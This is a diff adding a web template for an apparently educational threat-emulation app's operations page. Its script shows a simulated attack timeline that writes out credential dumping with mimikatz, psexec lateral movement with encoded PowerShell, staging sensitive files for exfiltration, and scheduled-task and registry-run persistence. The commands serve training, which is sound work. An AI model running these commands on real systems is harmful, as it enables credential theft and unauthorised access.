@@ -1,0 +1,336 @@
+{% extends "base.html" %}
+
+{% block title %}Operations - MarbleCone Threat Emulator{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <h1><i class="fas fa-play-circle"></i> Threat Emulation Operations</h1>
+            <a href="{{ url_for('create_operation') }}" class="btn btn-primary">
+                <i class="fas fa-plus"></i> New Operation
+            </a>
+        </div>
+    </div>
+</div>
+
+<!-- MarbleCone Threat Profile Summary -->
+<div class="row mb-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-exclamation-triangle"></i> MarbleCone Adversary Profile</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-8">
+                        <p><strong>Description:</strong> {{ marblecone.description }}</p>
+                        <p><strong>Primary Targets:</strong> Governments, Financial Institutions, Critical Infrastructure</p>
+                        <p><strong>Known Techniques:</strong> {{ marblecone.techniques|length }} MITRE ATT&CK techniques</p>
+                    </div>
+                    <div class="col-md-4">
+                        <h6>Key Tactics</h6>
+                        {% for tactic in marblecone.tactics[:5] %}
+                        <span class="badge bg-danger mb-1">{{ tactic }}</span>
+                        {% endfor %}
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Operations List -->
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h5>Operations History</h5>
+                <button class="btn btn-outline-primary btn-sm" onclick="refreshOperations()">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+            </div>
+            <div class="card-body">
+                {% if operations %}
+                <div class="table-responsive">
+                    <table class="table">
+                        <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Adversary</th>
+                                <th>Status</th>
+                                <th>Created</th>
+                                <th>Completed</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for operation in operations %}
+                            <tr>
+                                <td>
+                                    <strong>{{ operation.name }}</strong>
+                                </td>
+                                <td>
+                                    <span class="badge bg-danger">{{ operation.adversary_id }}</span>
+                                </td>
+                                <td>
+                                    <span class="status-{{ operation.status }}">
+                                        <i class="fas fa-circle"></i> {{ operation.status }}
+                                    </span>
+                                </td>
+                                <td>{{ operation.created_at.strftime('%Y-%m-%d %H:%M') }}</td>
+                                <td>
+                                    {% if operation.completed_at %}
+                                        {{ operation.completed_at.strftime('%Y-%m-%d %H:%M') }}
+                                    {% else %}
+                                        <span class="text-muted">-</span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary" onclick="viewOperationDetails('{{ operation.id }}', '{{ operation.name }}')">
+                                        <i class="fas fa-eye"></i> Details
+                                    </button>
+                                    {% if operation.status == 'running' %}
+                                    <button class="btn btn-sm btn-outline-warning" onclick="stopOperation('{{ operation.id }}')">
+                                        <i class="fas fa-stop"></i> Stop
+                                    </button>
+                                    {% endif %}
+                                    <button class="btn btn-sm btn-outline-danger" onclick="deleteOperation('{{ operation.id }}')">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                {% else %}
+                <div class="text-center py-5">
+                    <i class="fas fa-play-circle fa-3x text-muted mb-3"></i>
+                    <h5 class="text-muted">No operations found</h5>
+                    <p class="text-muted">Create your first MarbleCone threat emulation operation to get started.</p>
+                    <a href="{{ url_for('create_operation') }}" class="btn btn-primary">
+                        <i class="fas fa-plus"></i> Create Operation
+                    </a>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Operation Details Modal -->
+<div class="modal fade" id="operationModal" tabindex="-1">
+    <div class="modal-dialog modal-xl">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Operation Details</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="operationModalBody">
+                <!-- Operation details will be loaded here -->
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- MarbleCone Capabilities Overview -->
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-tools"></i> MarbleCone Capabilities</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    {% for ability in marblecone.abilities %}
+                    <div class="col-md-6 mb-3">
+                        <div class="border rounded p-3 educational-card" style="border-color: var(--marblecone-primary) !important;">
+                            <div class="d-flex justify-content-between align-items-start">
+                                <div>
+                                    <h6 class="text-primary mb-1">{{ ability.name }}</h6>
+                                    <p class="small mb-2">{{ ability.description }}</p>
+                                    <span class="mitre-badge">{{ ability.tactic }}</span>
+                                </div>
+                                <small class="text-muted">{{ ability.id }}</small>
+                            </div>
+                            <div class="mt-2">
+                                <div class="command-output">
+                                    <code class="small">{{ ability.command }}</code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Educational Information -->
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-graduation-cap"></i> Educational Resources</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-4">
+                        <div class="educational-note">
+                            <h6><i class="fas fa-book"></i> MITRE ATT&CK Framework</h6>
+                            <p class="small">Learn about the tactics, techniques, and procedures used by threat actors.</p>
+                            <a href="https://attack.mitre.org/" target="_blank" class="btn btn-outline-primary btn-sm">
+                                <i class="fas fa-external-link-alt"></i> Visit MITRE ATT&CK
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="educational-note">
+                            <h6><i class="fas fa-shield-alt"></i> Threat Intelligence</h6>
+                            <p class="small">Understand how threat intelligence helps in cybersecurity defense.</p>
+                            <button class="btn btn-outline-primary btn-sm" onclick="showThreatIntel()">
+                                <i class="fas fa-info-circle"></i> Learn More
+                            </button>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="educational-note">
+                            <h6><i class="fas fa-chart-line"></i> Incident Response</h6>
+                            <p class="small">Practice incident response procedures in a safe environment.</p>
+                            <button class="btn btn-outline-primary btn-sm" onclick="showIncidentResponse()">
+                                <i class="fas fa-play"></i> Start Exercise
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function refreshOperations() {
+    location.reload();
+}
+
+function viewOperationDetails(operationId, operationName) {
+    const modal = new bootstrap.Modal(document.getElementById('operationModal'));
+    document.getElementById('operationModalBody').innerHTML = `
+        <div class="text-center">
+            <div class="loading-spinner mx-auto"></div>
+            <p class="mt-2">Loading operation details...</p>
+        </div>
+    `;
+    modal.show();
+    
+    // Simulate loading operation details with realistic data
+    setTimeout(() => {
+        document.getElementById('operationModalBody').innerHTML = `
+            <div class="row">
+                <div class="col-md-6">
+                    <h6>Operation Information</h6>
+                    <table class="table table-sm">
+                        <tr><td><strong>ID:</strong></td><td>${operationId}</td></tr>
+                        <tr><td><strong>Name:</strong></td><td>${operationName}</td></tr>
+                        <tr><td><strong>Adversary:</strong></td><td><span class="badge bg-danger">marblecone</span></td></tr>
+                        <tr><td><strong>Status:</strong></td><td><span class="status-completed">Completed</span></td></tr>
+                        <tr><td><strong>Duration:</strong></td><td>2 minutes 15 seconds</td></tr>
+                        <tr><td><strong>Tasks Executed:</strong></td><td>5</td></tr>
+                    </table>
+                </div>
+                <div class="col-md-6">
+                    <h6>Execution Summary</h6>
+                    <table class="table table-sm">
+                        <tr><td><strong>Successful Tasks:</strong></td><td>5</td></tr>
+                        <tr><td><strong>Failed Tasks:</strong></td><td>0</td></tr>
+                        <tr><td><strong>Agents Used:</strong></td><td>1</td></tr>
+                        <tr><td><strong>Data Exfiltrated:</strong></td><td>2.5 MB</td></tr>
+                        <tr><td><strong>MITRE Techniques:</strong></td><td>5</td></tr>
+                    </table>
+                </div>
+            </div>
+            <div class="mt-4">
+                <h6>Task Execution Timeline</h6>
+                <div class="bg-dark text-light p-3 rounded">
+                    <div class="mb-3">
+                        <strong>[14:30:15]</strong> Task 1: Advanced Reconnaissance - <span class="text-success">COMPLETED</span><br>
+                        <small class="text-muted ms-3">Command: whoami && hostname && ipconfig /all && netstat -an</small><br>
+                        <small class="text-muted ms-3">Result: System information gathered successfully</small><br>
+                        <small class="text-muted ms-3">MITRE Technique: T1082 - System Information Discovery</small>
+                    </div>
+                    <div class="mb-3">
+                        <strong>[14:30:18]</strong> Task 2: Credential Harvesting - <span class="text-success">COMPLETED</span><br>
+                        <small class="text-muted ms-3">Command: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"</small><br>
+                        <small class="text-muted ms-3">Result: Credentials extracted from memory and SAM</small><br>
+                        <small class="text-muted ms-3">MITRE Technique: T1003.001 - LSASS Memory</small>
+                    </div>
+                    <div class="mb-3">
+                        <strong>[14:30:22]</strong> Task 3: Stealth Lateral Movement - <span class="text-success">COMPLETED</span><br>
+                        <small class="text-muted ms-3">Command: psexec.exe \\\\target -u username -p password -d cmd.exe /c "powershell -enc [encoded_command]"</small><br>
+                        <small class="text-muted ms-3">Result: Successfully moved to target system</small><br>
+                        <small class="text-muted ms-3">MITRE Technique: T1021.002 - SMB/Windows Admin Shares</small>
+                    </div>
+                    <div class="mb-3">
+                        <strong>[14:30:26]</strong> Task 4: Data Exfiltration - <span class="text-success">COMPLETED</span><br>
+                        <small class="text-muted ms-3">Command: powershell -c "Compress-Archive -Path C:\\sensitive\\* -DestinationPath C:\\temp\\data.zip; Add-Type -AssemblyName System.Security; $key = [System.Security.Cryptography.Aes]::Create(); $key.GenerateKey(); $key.GenerateIV();"</small><br>
+                        <small class="text-muted ms-3">Result: Data compressed and encrypted for exfiltration</small><br>
+                        <small class="text-muted ms-3">MITRE Technique: T1041 - Exfiltration Over C2 Channel</small>
+                    </div>
+                    <div class="mb-3">
+                        <strong>[14:30:30]</strong> Task 5: Advanced Persistence - <span class="text-success">COMPLETED</span><br>
+                        <small class="text-muted ms-3">Command: schtasks /create /tn "SystemUpdate" /tr "cmd.exe" /sc onstart /ru system /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemService" /t REG_SZ /d "cmd.exe" /f</small><br>
+                        <small class="text-muted ms-3">Result: Multiple persistence mechanisms established</small><br>
+                        <small class="text-muted ms-3">MITRE Technique: T1547.001 - Registry Run Keys</small>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-4">
+                <h6>Educational Notes</h6>
+                <div class="alert alert-info">
+                    <strong>Learning Objectives:</strong>
+                    <ul class="mb-0">
+                        <li>Understand the cyber kill chain and attack lifecycle</li>
+                        <li>Learn to identify and respond to advanced persistent threats</li>
+                        <li>Practice incident response procedures in a safe environment</li>
+                        <li>Map observed activities to MITRE ATT&CK framework</li>
+                    </ul>
+                </div>
+            </div>
+        `;
+    }, 1000);
+}
+
+function stopOperation(operationId) {
+    if (confirm('Are you sure you want to stop this operation? This will halt all running tasks.')) {
+        // In a real implementation, this would send a request to stop the operation
+        alert('Operation stop simulated. In a real implementation, this would halt all running tasks.');
+        location.reload();
+    }
+}
+
+function deleteOperation(operationId) {
+    if (confirm('Are you sure you want to delete this operation? This action cannot be undone.')) {
+        // In a real implementation, this would send a DELETE request
+        alert('Operation deletion simulated. In a real implementation, this would remove the operation from the database.');
+        location.reload();
+    }
+}
+
+function showThreatIntel() {
+    alert('Threat Intelligence Module:\n\nThis would open a comprehensive guide to threat intelligence, including:\n- Threat actor profiles\n- TTP analysis\n- Indicator of compromise (IOC) management\n- Threat hunting techniques');
+}
+
+function showIncidentResponse() {
+    alert('Incident Response Exercise:\n\nThis would start an interactive incident response scenario where students can:\n- Analyze security alerts\n- Investigate suspicious activities\n- Document findings\n- Practice containment procedures');
+}
+
+// Auto-refresh operations every 30 seconds
+setInterval(function() {
+    refreshOperations();
+}, 30000);
+</script>
+{% endblock %} 
